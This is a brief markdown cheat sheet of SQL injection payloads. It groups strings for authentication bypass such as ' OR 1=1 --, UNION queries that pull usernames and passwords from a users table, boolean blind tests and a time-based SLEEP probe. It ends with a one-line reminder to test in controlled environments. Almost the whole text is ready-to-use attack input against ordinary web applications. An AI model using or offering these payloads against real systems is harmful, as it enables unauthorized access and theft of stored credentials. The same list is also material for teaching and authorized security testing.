# 💣 SQL Injection Payloads

## 🔓 Authentication Bypass

```sql
' OR 1=1 --
' OR '1'='1' --
admin' --
```

---

## 📊 Data Extraction

```sql
' UNION SELECT NULL,NULL --
' UNION SELECT username,password FROM users --
```

---

## 🧠 Blind SQL Injection

```sql
' AND 1=1 --
' AND 1=2 --
```

---

## ⏳ Time-Based Injection

```sql
' OR SLEEP(5) --
```

---

## ⚠️ Notes
- Payload depends on database type
- Always test in controlled environments
